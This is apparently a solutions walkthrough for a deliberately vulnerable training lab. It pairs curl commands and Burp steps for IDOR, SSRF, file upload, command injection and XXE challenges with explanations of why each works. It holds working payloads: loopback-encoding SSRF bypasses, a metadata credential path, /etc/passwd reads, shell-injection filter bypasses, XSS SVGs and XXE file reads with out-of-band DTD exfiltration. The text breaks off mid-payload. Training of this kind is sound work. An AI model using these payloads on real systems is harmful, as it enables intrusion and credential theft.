**Burp workflow:** Open `/idor/apikey` and click regenerate while the Proxy intercepts the POST to `/idor/apikey/regen`. Send it to Repeater (Ctrl+R) and change the `user_id` form field to `1`, then Send; the response now prints a fresh key that belongs to admin. Copy that key into a new Repeater tab as `GET /idor/apikey/use?key=<fresh key>` and Send to authenticate as admin with the rotated key. Two Repeater tabs back to back is the whole trick: one to forge someone else's key, one to spend it.


**6. Forced Browsing to Admin Function** – `PENTRIX{...}`

1. Log in as alice (or bob), a non-admin user.
2. `curl -c jar -b jar http://<your-lab-address>/idor/admin/users`
   The full user list renders and the flag is awarded. The page is not linked
   anywhere for normal users, but nothing stops you from typing the URL.

Why it works: the endpoint only checks "logged in" and never the admin role,
so any authenticated user can force-browse the admin function.

**Burp workflow:** This one is about paths, not ids. Send any of your authenticated requests to Repeater (Ctrl+R) and rewrite the request line to `GET /idor/admin/users`, a page never linked anywhere in the UI for normal users. Send it with your alice or bob cookie attached and the full user list renders, because the endpoint checks "logged in" but never "is admin". Make this a habit: when an app links `/idor/admin`, try likely sibling paths in Repeater with your own session cookie.


**7. Comment Deletion IDOR** – `PENTRIX{...}`

1. Log in as bob and open `GET /idor/comments` to see comment ids.
2. Delete a comment written by someone else (admin's is id 1):
   `curl -c jar -b jar --data-urlencode "id=1" http://<your-lab-address>/idor/comments/delete`
   The comment is deleted and the flag is awarded.

Why it works: deletion is keyed by comment id only; authorship is never
checked.

**Burp workflow:** Log in as bob, open `GET /idor/comments` in the browser, and note the comment ids. Click delete on one of your own comments while the Proxy intercepts the POST to `/idor/comments/delete`, then send that request to Repeater (Ctrl+R). Change the `id` form field to `1` (admin's comment) and Send; the comment is deleted because the endpoint only reads the id and never checks authorship. Watch out in the Proxy history: this one is a POST, so the tampered parameter lives in the body, not the URL.


## ssrf – Server-Side Request Forgery

**1. Basic SSRF** – `PENTRIX{...}`
The fetcher requests any URL you give it, including internal ones:
```
GET /ssrf/fetch?url=http://<your-lab-address>/ssrf/internal/secret
```
Why it works: user input becomes the server's outbound request target, so you can make the server talk to itself.

**Burp workflow:** Browse the challenge page and watch Proxy for the request to `/ssrf/fetch` with the `url` parameter. Send it to Repeater (Ctrl+R). Point the `url` value at the internal secret endpoint on the app itself, then send. The response comes back with the secret marker, which confirms the server fetched your target. This is the baseline pattern for the whole module: you control the destination, the server does the requesting.


**2. Blocklist bypass** – `PENTRIX{...}`
`/ssrf/fetch2` blocks URLs containing the *strings* `127.0.0.1` or `localhost`. The same address has other spellings:
```
GET /ssrf/fetch2?url=http://2130706433:<lab-port>/ssrf/internal/secret
```
(`2130706433` is the decimal form of `127.0.0.1`.)
Why it works: string blocklists are not address validation. Parse the URL, resolve the host, then decide.

**Burp workflow:** Capture the request to `/ssrf/fetch2` in Proxy and send it to Repeater. Notice that `url=http://127.0.0.1:<lab-port>/...` gets rejected because the blocklist looks for that literal string. Try the same request again but change the `url` parameter so the host spells the same loopback address without containing the blocked text (a different numeric form of the address). The blocklist compares strings, the URL parser resolves addresses, so you win when your spelling resolves to loopback but does not match the blocked text.


---


**3. Open-redirect SSRF** – `PENTRIX{...}`

`/ssrf/fetch3` follows redirects (up to 5) but only inspects the *initial*
URL's hostname against its blocklist (`127.0.0.1`). Bounce the fetch through
the open redirect at `/ssrf/jump`, whose `to` parameter goes anywhere,
including the blocked internal host:

```bash
curl --get --data-urlencode \
  "url=http://localhost:<lab-port>/ssrf/jump?to=http://127.0.0.1:<lab-port>/ssrf/internal/secret" \
  http://<your-lab-address>/ssrf/fetch3
```

The response contains the internal secret marker `SSRF-INTERNAL-9921` and the
flag `PENTRIX{...}`. Note the initial URL aims the `/ssrf/jump` prefix at
`localhost` on purpose: fetch3 rejects the blocked loopback `127.0.0.1` as
the *initial* URL's host, so a request that starts at
`http://127.0.0.1:<lab-port>/ssrf/jump?...` dies with 403 before any
redirect is followed. The redirect target keeps `127.0.0.1` because that is
the blocked host the redirect smuggles the fetch to.

The response contains the internal secret marker `SSRF-INTERNAL-9921` and the
flag `PENTRIX{...}`. The page awards the flag only when at
least one redirect was actually followed, so a direct fetch of the secret
through `/ssrf/fetch3` shows the marker but earns no flag. Fetching
`http://127.0.0.1:<lab-port>/...` directly still returns 403.

Why it works: the blocklist is checked against the first URL only and the
redirect target is never re-validated, so the 302 response from `/ssrf/jump`
smuggles the server-side request to the blocked host.

**Burp workflow:** Intercept the request to `/ssrf/fetch3` and send it to Repeater. Setting the `url` parameter straight to the blocked loopback address returns a 403, and the fetcher only checks the first hostname it sees. Build a chained URL instead: set `url` to the app's open-redirect route `/ssrf/jump` with its `to` parameter aimed at the internal secret, so the fetch starts allowed and the redirect carries it to the blocked host. Make sure the `url` value is properly URL-encoded in Repeater before you send it. You need at least one real redirect to be followed for the flag, not just the marker.


**4. Userinfo bypass** – `PENTRIX{...}`

`/ssrf/userinfo` "allows" only URLs containing the string `pentrix.lab`.
Smuggle the trusted string in as userinfo (everything before `@` is
credentials, not the host):

```bash
curl --get --data-urlencode \
  "url=http://pentrix.lab@127.0.0.1:<lab-port>/ssrf/internal/secret" \
  http://<your-lab-address>/ssrf/userinfo
```

The check sees `pentrix.lab` and passes, but the request really goes to
`127.0.0.1:<lab-port>`, returning the secret marker and the flag
`PENTRIX{...}`.

Why it works: the allowlist is a raw substring test instead of parsing the
real hostname, so userinfo positioning tricks it while the URL parser routes
to loopback.

**Burp workflow:** Capture the request to `/ssrf/userinfo` in Proxy and send it to Repeater. The challenge only passes URLs that contain the string `pentrix.lab`, but it never parses the hostname properly. In Repeater, keep the `url` parameter but insert the trusted string as userinfo, the part before the `@`, in front of the real loopback destination. The naive check sees its substring and passes, while the URL parser routes the actual request to the host after the `@`. Send and read the response for the secret marker.


**5. Hex IP bypass** – `PENTRIX{...}`

`/ssrf/hex-ip` blocks the literal strings `127.0.0.1` and `localhost` in the
raw URL. Use hex octets, which the WHATWG URL parser normalizes to 127.0.0.1:

```bash
curl --get --data-urlencode \
  "url=http://0x7f.0.0.1:<lab-port>/ssrf/internal/secret" \
  http://<your-lab-address>/ssrf/hex-ip
```

The string `0x7f.0.0.1` contains no blocked substring, yet the fetcher
connects to loopback and returns the secret marker plus the flag
`PENTRIX{...}`.

Why it works: the blocklist compares raw strings while the URL parser
normalizes alternate IP spellings, so the normalized request and the
blocklisted string never match.

**Burp workflow:** Intercept the `/ssrf/hex-ip` request and send it to Repeater. The blocklist rejects the literal strings `127.0.0.1` and `localhost` in the raw URL, so change the `url` parameter to use hex octets for the loopback address instead of dotted decimal. Send it: the blocklist sees none of its blocked strings, the URL parser normalizes the hex form back to 127.0.0.1, and the fetch lands on the internal secret endpoint. This one is just changing the host spelling in the `url` field, nothing else.


**6. Octal IP bypass** – `PENTRIX{...}`

Same naive blocklist on `/ssrf/octal-ip`. Leading zeros make the parser read
octets as octal (`0177` = 127):

```bash
curl --get --data-urlencode \
  "url=http://0177.0.0.1:<lab-port>/ssrf/internal/secret" \
  http://<your-lab-address>/ssrf/octal-ip
```

No blocked substring is present, the request lands on loopback, and the page
returns the secret marker with the flag `PENTRIX{...}`.

Why it works: the blocklist only knows dotted decimal, but the URL parser
interprets zero-padded parts as octal, resolving `0177.0.0.1` to 127.0.0.1.

**Burp workflow:** Same drill on `/ssrf/octal-ip`: Proxy the request, send to Repeater, and look at the `url` parameter. The blocklist only knows dotted decimal, so rewrite the loopback host with leading zeros so the parser reads the first octet as octal (zero-padded numbers parse as octal in the URL parser). Send the request and the fetch resolves to loopback without any blocked substring appearing in your URL. Quick one: one field, one spelling change, flag.


**7. 0.0.0.0 bypass** – `PENTRIX{...}`

`/ssrf/zero-ip` never mentions `0.0.0.0` in its blocklist, and this fetcher
treats it as "this host":

```bash
curl --get --data-urlencode \
  "url=http://0.0.0.0:<lab-port>/ssrf/internal/secret" \
  http://<your-lab-address>/ssrf/zero-ip
```

The fetch succeeds against loopback and the flag `PENTRIX{...}`
is awarded.

Why it works: `0.0.0.0` is a loopback-adjacent address the blocklist simply
never considered, and the fetcher rewrites it to 127.0.0.1 the way several
real HTTP stacks do.

**Burp workflow:** Capture the `/ssrf/zero-ip` request and send it to Repeater. This blocklist never mentions the address `0.0.0.0`, and this fetcher treats it as "this host", like several real HTTP stacks do. Set the `url` parameter's host to `0.0.0.0` pointing at the internal secret path and send. No clever encoding needed here: it works because the address was simply left off the blocklist.


**8. Cloud metadata SSRF** – `PENTRIX{...}`

`/ssrf/fetch-meta` simulates a cloud instance metadata service at the
link-local address 169.254.169.254, which nothing blocks:

```bash
curl --get --data-urlencode \
  "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/" \
  http://<your-lab-address>/ssrf/fetch-meta
```

The simulated metadata document (including fake IAM credentials whose secret
access key embeds the marker `SSRF-INTERNAL-9921`) is returned and the flag
`PENTRIX{...}` is awarded.

Why it works: the fetcher does not restrict destination addresses, so the
classic cloud metadata endpoint is reachable server-side and leaks instance
credentials.

**Burp workflow:** Capture the `/ssrf/fetch-meta` request and send it to Repeater. Nothing blocks the link-local metadata address, so change the `url` parameter to point at the simulated metadata service and walk its paths like you would on a real cloud box: start at the document root and drill down into the IAM credentials path. Send each step and read the returned document; the credentials embed the marker and earn the flag. Think of it as two minutes of recon through a fetcher, the same shape as the classic real-world metadata attack.


**9. file:// scheme SSRF** – `PENTRIX{...}`

`/ssrf/fetch-file` accepts the `file:` scheme and reads the path with the
server's filesystem privileges:

```bash
curl --get --data-urlencode "url=file:///etc/passwd" \
  http://<your-lab-address>/ssrf/fetch-file
```

The page shows the contents of `/etc/passwd` (look for the `root:` line) and
awards the flag `PENTRIX{...}`.

Why it works: allowing `file://` in a URL fetcher turns it into a local file
reader running with the server's privileges.

**Burp workflow:** Intercept the request to `/ssrf/fetch-file` and send it to Repeater. This fetcher accepts the `file:` scheme, so change the `url` parameter from an `http://` URL to a `file://` URL pointing at a local file the server can read, like the system password file. Send it and the page shows the file contents, which proves the fetcher is reading with the server's own filesystem privileges. Start with readable system files, then think about what app files would live on the same box.


---
---


## upload – Unrestricted File Upload

**1. Stored XSS via upload** – `PENTRIX{...}`
No content checks at all, and files are served inline, so an uploaded SVG executes in the browser:
```
curl --data-binary @evil.svg "http://<your-lab-address>/upload?filename=evil.svg"
```
Why it works: the server never asks *what* the file is, and serving HTML/SVG inline turns storage into script execution.

**Burp workflow:** In the Proxy, intercept the file upload POST to `/upload?filename=evil.svg` and send it to Repeater (Ctrl+R). In Repeater, change the filename query param and the request body to an SVG with a script tag, then send. Refresh the stored file URL under `/uploads/` in the browser to confirm the SVG renders inline and the script executes, proving stored XSS.


**2. Double extension bypass** – `PENTRIX{...}`

`/upload/ext-blacklist` blocks `.svg`/`.html`/`.htm` by exact, case-sensitive
*final* extension only, while `/upload/view/:name` guesses the served content
type from a substring of the filename. Upload a file with a harmless final
extension but a dangerous middle one:

```bash
printf '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>' \
  | curl --data-binary @- "http://<your-lab-address>/upload/ext-blacklist?filename=shell.svg.jpg"
```

The response contains the flag `PENTRIX{...}`. Verify it
is served as active content:

```bash
curl -sI http://<your-lab-address>/upload/view/shell.svg.jpg   # Content-Type: image/svg+xml
curl -s  http://<your-lab-address>/upload/view/shell.svg.jpg   # payload intact
```

Why it works: `path.extname("shell.svg.jpg")` is `.jpg`, so the blacklist
misses it, but the viewer's substring check finds `.svg` and serves the file
as SVG, so embedded scripts execute in a victim's browser.

**Burp workflow:** In the Proxy, intercept the upload POST to `/upload/ext-blacklist?filename=` and send it to Repeater (Ctrl+R). In Repeater, set the filename to `shell.svg.jpg`: the blacklist sees only the final `.jpg`, while the viewer at `/upload/view/:name` guesses the content type from a substring of the filename and serves it as SVG. Open the served URL and check the `Content-Type` response header reads `image/svg+xml` to confirm the active content serves.


**3. Case-sensitive blacklist bypass** – `PENTRIX{...}`

The same v3 blacklist compares the extension exactly as written, without
lowercasing:

```bash
printf '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>' \
  | curl --data-binary @- "http://<your-lab-address>/upload/ext-blacklist?filename=evil.SVG"
```

`evil.SVG` dodges the lowercase `.svg` entry and the flag
`PENTRIX{...}` is awarded. Fetching
`/upload/view/evil.SVG` shows it served as `image/svg+xml` with the payload
intact.

Why it works: the blacklist does a case-sensitive string comparison, but the
viewer lowercases before guessing the content type, so the uppercase variant
is stored yet still served as active SVG.

**Burp workflow:** In the Proxy, intercept the upload POST to `/upload/ext-blacklist?filename=` and send it to Repeater (Ctrl+R). In Repeater, try an uppercase variant like `evil.SVG`: the blacklist compares the extension case-sensitively, but the viewer lowercases the name before guessing the content type. Fetch `/upload/view/evil.SVG` and confirm the `Content-Type` is `image/svg+xml` with your payload intact.


**4. Content-Type header spoofing** – `PENTRIX{...}`

`/upload/mime-check` decides "is this an image" from the client-supplied
`Content-Type` request header alone, never inspecting the bytes:

```bash
printf '<html><body><script>alert(1)</script></body></html>' \
  | curl -H "Content-Type: image/png" --data-binary @- \
    "http://<your-lab-address>/upload/mime-check?filename=evil.html"
```

The HTML file is accepted and the flag `PENTRIX{...}` is
awarded. `/upload/view/evil.html` returns it as `text/html`.

Why it works: the header is fully attacker-controlled, so lying about the
content type sails past a check that never looks at the actual file bytes.

**Burp workflow:** In the Proxy, intercept the upload POST to `/upload/mime-check?filename=evil.html` and send it to Repeater (Ctrl+R). In Repeater, change the `Content-Type` request header to `image/png` while keeping HTML in the body: the server decides "is this an image" from your header alone, never the bytes. Fetch `/upload/view/evil.html` afterwards to confirm it was accepted and served as `text/html`.


**5. Path traversal on write** – `PENTRIX{...}`

`/upload/traverse` joins the raw filename to the uploads directory with no
basename or containment check. Escape the directory with `../`:

```bash
printf 'TRAVERSAL-PROOF' \
  | curl -c jar --data-binary @- "http://<your-lab-address>/upload/traverse?filename=../pwn.txt"
```

The file lands one level above the uploads dir, but the upload alone only
arms the proof: no flag yet. Prove the round trip in the same session through
the prove endpoint, which serves the escaped file back only if it matches the
bytes you uploaded:

```bash
curl -b jar "http://<your-lab-address>/upload/traverse-prove?f=../pwn.txt"   # flag awarded here
curl "http://<your-lab-address>/upload/traversed?f=../pwn.txt"   # also prints TRAVERSAL-PROOF, but awards nothing
```

Why it works: `path.join` does not stop `../` segments from escaping the
intended directory, so both the write and the read resolve outside the
uploads folder.

**Burp workflow:** In the Proxy, intercept the upload POST to `/upload/traverse?filename=` and send it to Repeater (Ctrl+R). In Repeater, set the filename to `../pwn.txt`: there is no basename or containment check, so the write lands one level above the uploads directory. Then, in the same session, GET `/upload/traverse-prove?f=../pwn.txt`: the flag fires only when the escaped file is read back byte-identical, proving the write really escaped. (`/upload/traversed?f=../pwn.txt` shows the bytes too, but it is not the award step.)


**6. Strip-once filter bypass** – `PENTRIX{...}`

`/upload/filter` removes each dangerous extension (`.svg`, `.html`, `.htm`)
exactly once with a non-global `replace`. Nest the extension inside itself so
one removal rebuilds it:

```bash
printf '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>' \
  | curl --data-binary @- "http://<your-lab-address>/upload/filter?filename=evil.s.svgvg"
```

`evil.s.svgvg` minus one occurrence of `.svg` becomes `evil.svg`; the file is
stored under that name and the flag `PENTRIX{...}` is
awarded. `/upload/view/evil.svg` serves it as `image/svg+xml`.

Why it works: the filter runs only once, so nesting the banned string inside
itself (`.s.svgvg` -> `.svg`) reconstructs the dangerous extension after the
single strip.

**Burp workflow:** In the Proxy, intercept the upload POST to `/upload/filter?filename=` and send it to Repeater (Ctrl+R). In Repeater, nest the banned extension inside itself with a name like `evil.s.svgvg`: the filter removes `.svg` exactly once with a non-global replace, so one removal rebuilds `.svg` in the stored filename. Fetch `/upload/view/evil.svg` and check the `Content-Type` is `image/svg+xml` to confirm the bypass.


**7. Avatar overwrite** – `PENTRIX{...}`

`/upload/avatar` stores files at predictable paths (`avatar-<user>.png`) and
never checks that the uploader owns the target user. Overwrite bob's avatar:

```bash
printf 'ATTACKER-BYTES' \
  | curl --data-binary @- "http://<your-lab-address>/upload/avatar?user=bob"
```

Since bob's avatar bytes changed from the original, the flag
`PENTRIX{...}` is awarded. Verify the victim URL now
serves attacker content:

```bash
curl http://<your-lab-address>/upload/avatar/bob   # prints ATTACKER-BYTES
```

Why it works: predictable filenames plus no ownership check let anyone write
any user's file, and the serve path even sniffs content, rendering an HTML
replacement as a page.

**Burp workflow:** In the Proxy, intercept the avatar upload POST to `/upload/avatar?user=bob` and send it to Repeater (Ctrl+R). In Repeater, replace the request body with your own bytes and send: there is no ownership check on the target user, and filenames are predictable (`avatar-bob.png`). Then GET `/upload/avatar/bob` and compare the returned bytes to prove another user's file was overwritten.


**8. GIF/HTML polyglot** – `PENTRIX{...}`

`/upload/polyglot` "validates" images by checking only the first 6 magic
bytes, then `/upload/poly/:name` serves the file as `text/html`. A file can
carry a real GIF header and real HTML at once:

```bash
printf 'GIF89a<script>alert(1)</script>' \
  | curl --data-binary @- "http://<your-lab-address>/upload/polyglot?filename=x.gif"
```

The magic bytes pass, the scriptable HTML survives, and the flag
`PENTRIX{...}` is awarded. Fetching
`/upload/poly/x.gif` returns `Content-Type: text/html` with
`GIF89a<script>alert(1)</script>` intact, so the browser executes it.

Why it works: magic-byte checks only validate the file's first bytes, and
serving the "validated image" as HTML executes the rest, making a true
polyglot that is both a GIF header and a script.

**Burp workflow:** In the Proxy, intercept the upload POST to `/upload/polyglot?filename=x.gif` and send it to Repeater (Ctrl+R). In Repeater, craft a body that starts with a real GIF header followed by HTML: the magic-byte check only inspects the first 6 bytes, so it passes. Open `/upload/poly/x.gif` and confirm the `Content-Type` is `text/html` with your scriptable HTML intact, proving the same file is both a valid image header and executable markup.

---


## cmdi – Command Injection

**1. Ping gadget** – `PENTRIX{...}`
Your input is concatenated into a shell command with zero filtering:
```
GET /cmdi/ping?host=127.0.0.1;id
```
Why it works: `;` ends the `ping` command and starts yours. The server runs it with its own privileges.

**Burp workflow:** In the Proxy, intercept the form submit on the ping gadget page, then push the request to Repeater (Ctrl+R). In Repeater, keep a valid value in `host` and append a command separator right after it, followed by a command with loud, unmistakable output. Hit Send and read the response body: the injected command ran only if its real output appears alongside the ping output.


**2. Filter bypass** – `PENTRIX{...}`
v2 strips `;`, once. Shells offer other chaining operators:
```
GET /cmdi/ping2?host=127.0.0.1%26%26id
```
(`%26%26` is `&&`.) Newlines (`%0a`) and `||` work too.
Why it works: removing one bad character is not sanitization. Never build shell commands from user input; use argument arrays instead.

**Burp workflow:** Intercept the v2 ping request in the Proxy and send it to Repeater (Ctrl+R). In Repeater, put URL-encoded separators into `host` so the raw filter never sees them, then resend and watch for the injected command's output in the response. For wider coverage, send the same request to Intruder (Ctrl+I) with the separator marked as the payload position and run a small payload set of separators through `host`.


---


**3. Ping Gadget v3 (spaces stripped)** - `PENTRIX{...}`

Request:

```
GET /cmdi/ping3?host=127.0.0.1;cat$IFS/etc/passwd
```

The filter deletes every space, so `cat /etc/passwd` becomes `cat/etc/passwd` and
breaks. `$IFS` is the shell's Internal Field Separator variable: unquoted, it expands
to whitespace, giving the shell `cat /etc/passwd` again. The output shows `root:` and
the flag is awarded.

Why it works: the blacklist removes spaces but the shell still expands `$IFS` into a
word separator at run time.

**Burp workflow:** Intercept the ping3 request in the Proxy, then push it to Repeater (Ctrl+R). In Repeater, append your chained command to `host` and replace every literal space with the shell's whitespace variable `$IFS`, which the filter does not strip. Send it and confirm the response body shows the injected command's real output, meaning the shell rebuilt your spacing at run time.


**4. Ping Gadget v4 ($IFS blocked too)** - `PENTRIX{...}`

Request (note: `{` and `}` must be URL-encoded as `%7B`/`%7D`, `$` as `%24`):

```
GET /cmdi/ping4?host=127.0.0.1;cat%24%7BIFS%7D/etc/passwd
```

The filter now also strips the literal string `$IFS`. The braced form `${IFS}` refers
to the same variable but does not match the naive string filter, so the shell still
sees `cat /etc/passwd`.

Why it works: string-matching filters do not understand shell syntax, and `${IFS}`
expands exactly like `$IFS`.

**Burp workflow:** Intercept the ping4 request in the Proxy and send it to Repeater (Ctrl+R). In Repeater, rewrite the word separators in `host` using the braced spelling `${IFS}`, which the naive string filter misses while the shell expands exactly the same way, and keep the whole thing spaceless. Hit Send and read the response body for the injected command's real output.


**5. Ping Gadget v5 (separators blocked)** - `PENTRIX{...}`

Request (`%0a` is a URL-encoded newline):

```
GET /cmdi/ping5?host=127.0.0.1%0acat%20/etc/passwd
```

The filter strips `;`, `&` and `|`, but a newline also terminates a shell command.
The shell receives two lines - `ping -c 1 127.0.0.1` and `cat /etc/passwd` - and runs
both. The output shows `root:` and the flag is awarded.

Why it works: the blacklist forgot that newline is a command separator, and the
value is placed into the command unquoted.

**Burp workflow:** Intercept the ping5 request in the Proxy and push it to Repeater (Ctrl+R). In Repeater, place a URL-encoded newline (`%0a`) between a valid host and your second command inside `host`, so the server receives two shell statements on two lines. Send it and check the response body: the newline terminates the ping command even though `;`, `&`, and `|` are all stripped.


**6. Ping Gadget v6 ($() blocked)** - `PENTRIX{...}`

Request:

```
GET /cmdi/ping6?host=127.0.0.1;echo%20`id`
```

The filter removes `$(`, killing modern `$(...)` substitution. Backticks are the
legacy command-substitution syntax and are untouched, so `` `id` `` runs and its
output (`uid=...`) is echoed.

Why it works: the filter blocks one command-substitution syntax but the shell honors
two.

**Burp workflow:** Intercept the ping6 request in the Proxy and send it to Repeater (Ctrl+R). In Repeater, chain a second command after the valid host in `host`, and wrap the command you want to execute in the legacy backtick pair, which the filter does not strip even though `$(` is blocked. Use Repeater's URL-decode view to confirm what the server actually received, then read the response body for the real output of the substituted command.


**7. Ping Gadget v7 (cat and / blocked)** - `PENTRIX{...}`

Request (`?` encoded as `%3F`, space as `%20`):

```
GET /cmdi/ping7?host=127.0.0.1;/%3F%3F%3F/bin/%3Fat%20/%3F%3F%3F/p%3Fsswd
```

The filter strips the word `cat` and standalone `/` tokens. `?` is a glob wildcard
matching any single character, so the shell expands `/???/bin/?at` to `/bin/cat` and
`/???/p?sswd` to `/etc/passwd` (and `/bin/passwd`) at run time. Neither blocked word
is ever typed. The output contains `root:` and the flag is awarded.

Why it works: the blacklist matches literal words, but glob wildcards let the shell
itself rebuild the blocked words during pathname expansion.

**Burp workflow:** Intercept the ping7 request in the Proxy and send it to Repeater (Ctrl+R). In Repeater, build your chained command in `host` without ever typing the banned words: use `?` glob wildcards for the letters you cannot type, and URL-encode the `?` characters themselves so Burp sends them correctly. Send it and read the response body, letting the shell's pathname expansion rebuild the blocked paths at run time.


**8. Ping Gadget v8 (; blocked)** - `PENTRIX{...}`

Request:

```
GET /cmdi/ping8?host=127.0.0.1|id
```

Only `;` is stripped. The pipe `|` chains commands without it: `ping -c 1 127.0.0.1`
runs, its output is piped into `id`, and `id` prints `uid=...`.

Why it works: `|` is a command separator the single-character blacklist never
considered.

**Burp workflow:** Intercept the ping8 request in the Proxy and push it to Repeater (Ctrl+R). In Repeater, chain your second command after a valid host in `host` using the pipe `|`, which the single-character filter never considered. Send it and confirm the response body carries your second command's real output, which proves the pipe terminated the ping command.


**9. Ping Gadget v9 (spaces blocked, again)** - `PENTRIX{...}`

Request (`%09` is a URL-encoded tab):

```
GET /cmdi/ping9?host=127.0.0.1;cat%09/etc/passwd
```

Spaces are stripped, but a literal tab is also shell whitespace. The shell sees
`cat<TAB>/etc/passwd`, runs it, and the output shows `root:`.

Why it works: the filter blocks one whitespace character while the shell accepts
several (space, tab, newline).

**Burp workflow:** Intercept the ping9 request in the Proxy and send it to Repeater (Ctrl+R). In Repeater, append your chained command to `host` and use a URL-encoded tab (`%09`) as the word separator instead of a space, since tabs are shell whitespace that the filter does not strip. Hit Send and read the response body for the injected command's real output.


## xxe – XML External Entity Injection

**1. XXE file read** – `PENTRIX{...}`
The XML importer resolves external entities. Declare one pointing at a local file (the lab pages print the exact absolute path of `modules/xxe/secret.txt` for your install; substitute it wherever `<absolute-path-to>` appears in this module):
```xml
<?xml version="1.0"?>
<!DOCTYPE data [<!ENTITY xxe SYSTEM "file://<absolute-path-to>/modules/xxe/secret.txt">]>
<data><name>&xxe;</name></data>
```
```
POST /xxe/import   (form field: xml)
```
Why it works: the parser fetches `file://` URIs and substitutes the file contents into the document.

**Burp workflow:** Browse to the XML importer page and submit a normal import while the Proxy intercepts; right-click the POST request and send it to Repeater (Ctrl+R). In Repeater, keep the `xml` form field but swap its value for your DOCTYPE payload: declare a SYSTEM entity pointing at the file you want and reference it inside the body element, e.g. declare `<!ENTITY xxe SYSTEM "file:///...">` and put `&xxe;` inside `<name>`. Send it and the parsed response shows the file contents where your entity was referenced, which proves the parser resolved the external entity.


**2. SSRF via XXE** – `PENTRIX{...}`
The same entity expander also fetches `http://` URLs. Point the entity at the SSRF module's internal secret endpoint and chain XXE into SSRF. Same request shape as above with an `http://` SYSTEM URI.

**Burp workflow:** Intercept the same POST /xxe/import request as challenge 1 and send it to Repeater (Ctrl+R). Change only the SYSTEM URI of your entity from a `file://` path to an `http://` URL pointing at the SSRF module's internal secret endpoint (it lives on the same lab host, so use the lab port, not localhost tricks yet). Submit and check the response: the server fetched the URL and embedded the result, turning your XXE into an SSRF. If the response is empty, send the request again and compare, the entity resolved but the endpoint may return nothing visible.


---


**3. Billion Laughs (Entity-Expansion DoS)** - `PENTRIX{...}`

Request (use `--data-urlencode` so the `&` characters survive):

```
POST /xxe/billion
xml=<!DOCTYPE lolz [<!ENTITY lol "xxxxxxxxxx"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"> ... up to lol7 ... ]><data>&lol7;</data>
```

Each level references the previous one ten times, so expansion multiplies the work by
ten per level. The endpoint expands internal entities recursively with no depth
limit: the 7-level payload (515 bytes in) expands to ~16 MB and keeps the parser
busy for seconds. The flag is awarded when parse time exceeds 1.5 s (or expansion
passes 5 MB, which de-flakes fast hardware). Verified: 16,111,259 chars expanded,
~2.6 s parse time.

Why it works: recursive entity expansion is exponential, and nothing caps the
recursion depth or total output.

**Burp workflow:** Intercept POST /xxe/billion with a plain short XML body and send it to Repeater (Ctrl+R). Replace the `xml` field value with your nested entity payload (entities named lol through lol7, each level referencing the previous one ten times) and make sure the whole thing is URL-encoded so the `&` characters survive form parsing. Send it and watch the timing in Repeater: a 500-byte input that takes seconds to parse (the flag fires past 1.5 s of parse time) confirms exponential expansion with no depth limit.


**4. External DTD Exfiltration** - `PENTRIX{...}`

Step 1 - host the malicious DTD on the in-lab collector:

```
POST /xxe/collector/dtd
dtd=<!ENTITY % file SYSTEM "file://<absolute-path-to>/modules/xxe/secret.txt">
<!ENTITY pingback SYSTEM "http://<your-lab-address>/xxe/collector/log?d=%file;">
```

Step 2 - import XML that pulls in the hosted DTD:

```
POST /xxe/dtd
xml=<!DOCTYPE r [<!ENTITY % dtd SYSTEM "http://<your-lab-address>/xxe/collector/dtd"> %dtd;]><data>&pingback;</data>
```

The endpoint fetches the DTD, expands `%file;` inside it (reading `secret.txt` into
the pingback URL), then resolves the `pingback` entity, which makes the server
request `/xxe/collector/log?d=XXE-SECRET-4471`. The exfiltrated secret lands in the
collector log, and the flag is awarded. (The collector page shows a ready-to-paste
DTD template with the correct absolute path and port.)

Why it works: external DTDs are fetched and their parameter entities are honored, so
a DTD can turn a file read into a server-side request carrying the file content.

**Burp workflow:** This one is two requests. First, send the POST /xxe/collector/dtd request (with your hosted DTD in the `dtd` field) to Repeater (Ctrl+R) and submit it so the lab is hosting your malicious DTD, declaring a parameter entity that reads the file and a second entity whose SYSTEM URI pings the collector log with the file content. Then intercept the second request, POST /xxe/dtd, and set its `xml` field to an XML document whose internal subset declares `%dtd;` pointing at your hosted DTD URL and then references `&pingback;`. Submit it, then check the collector log page: your pingback arrives with the file content in the `d` parameter.


**5. XXE in Uploaded SVG** - `PENTRIX{...}`

Request:

```
POST /xxe/svg
svg=<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file://<absolute-path-to>/modules/xxe/secret.txt">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
```

The SVG text extractor runs the module's entity-expanding parser before pulling out
`<text>` elements. An SVG is just XML, so the DOCTYPE rides along, the `file://`
entity is resolved, and the secret appears in the extracted text.

Why it works: the "parser" expands external entities on any XML it is handed,
including uploaded SVGs.

**Burp workflow:** Go to the SVG upload page, upload any small SVG while the Proxy intercepts the POST /xxe/svg request, and send it to Repeater (Ctrl+R). Keep the `svg` field but prepend a DOCTYPE declaring a `file://` SYSTEM entity and reference it inside the `<text>` element, since the extractor reads text nodes after entity expansion. Submit: the extracted-text response now contains the file contents instead of your original text. Remember an SVG is just XML, so the same entity trick works wherever the parser runs.


**6. XInclude File Inclusion** - `PENTRIX{...}`

Request:

```
POST /xxe/xinclude
xml=<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file://<absolute-path-to>/modules/xxe/secret.txt" parse="text"/></root>
```

The endpoint honors `<xi:include>` tags and resolves the `href` server-side with the
same `file://`/`http://` support as entities. The file content is spliced into the
document and shown in the output.

Why it works: `xi:include` hrefs are fetched server-side with no allowlist, which is
XXE by another name.

**Burp workflow:** Intercept POST /xxe/xinclude from the lab page and send it to Repeater (Ctrl+R). Replace the `xml` field with a root element carrying the XInclude namespace (`xmlns:xi="http://www.w3.org/2001/XInclude"`) and a single `<xi:include href="file:///...">` tag with `parse="text"`. Submit and read the response: the endpoint fetches the href server side and splices the file into the output, which is XXE by another name and needs no DOCTYPE at all.


**7. Parameter-Entity OOB Exfiltration** - `PENTRIX{...}`

Request (single quotes around the inner URL are required):

```
POST /xxe/param
xml=<!DOCTYPE r [
<!ENTITY % file SYSTEM "file://<absolute-path-to>/modules/xxe/secret.txt">
